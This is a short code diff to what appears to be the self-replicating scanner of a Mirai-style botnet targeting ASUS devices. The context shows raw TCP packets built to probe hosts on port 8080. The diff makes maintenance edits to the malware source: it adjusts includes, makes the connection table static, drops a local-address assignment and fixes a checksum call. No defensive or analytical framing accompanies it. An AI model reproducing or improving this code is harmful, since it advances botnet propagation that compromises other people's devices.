@@ -16,8 +16,6 @@
 #include <signal.h>
 #include <errno.h>
 #include <string.h>
-#include <linux/ip.h>
-#include <linux/tcp.h>
 
 #include "includes.h"
 #include "selfrep_asus.h"
@@ -28,7 +26,7 @@
 
 int asus_scanner_pid = 0, asus_rsck = 0, asus_rsck_out = 0;
 char asus_scanner_rawpkt[sizeof(struct iphdr) + sizeof(struct tcphdr)] = {0};
-struct asus_scanner_connection *conn_table;
+static struct asus_scanner_connection *conn_table;
 uint32_t asus_fake_time = 0;
 
 int asus_recv_strip_null(int sock, void *buf, int len, int flags)
@@ -63,7 +61,6 @@ void asus_scanner_init(void)
     if(asus_scanner_pid > 0 || asus_scanner_pid == -1)
         return;
 
-    LOCAL_ADDR = util_local_addr();
 
     rand_init();
     asus_fake_time = time(NULL);
@@ -149,7 +146,7 @@ void asus_scanner_init(void)
                 tcph->dest = htons(8080);
                 tcph->seq = iph->daddr;
                 tcph->check = 0;
-                tcph->check = checksum_tcpudp(iph, tcph, htons(sizeof(struct tcphdr)), sizeof(struct tcphdr));
+                tcph->check = checksum_tcpudp(iph, (uint16_t *)tcph, htons(sizeof(struct tcphdr)), sizeof(struct tcphdr));
 
                 paddr.sin_family = AF_INET;
                 paddr.sin_addr.s_addr = iph->daddr;
